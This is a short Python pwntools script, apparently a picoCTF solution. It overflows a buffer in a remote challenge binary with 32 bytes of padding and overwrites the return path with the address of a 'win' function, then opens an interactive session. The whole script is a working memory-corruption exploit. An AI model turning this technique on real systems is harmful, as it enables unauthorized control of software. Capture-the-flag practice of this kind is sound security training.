from pwn import *

pr = remote('mimas.picoctf.net', 55796)
# pr = process('./chall')
elf = ELF('./chall')


payload = b'a' * 32 
payload += p64(elf.symbols['win'])

pr.sendlineafter(b'choice: ', b'2')

pr.sendlineafter(b'Data for buffer: ' ,payload)

pr.sendlineafter(b'choice: ', b'4')
pr.interactive()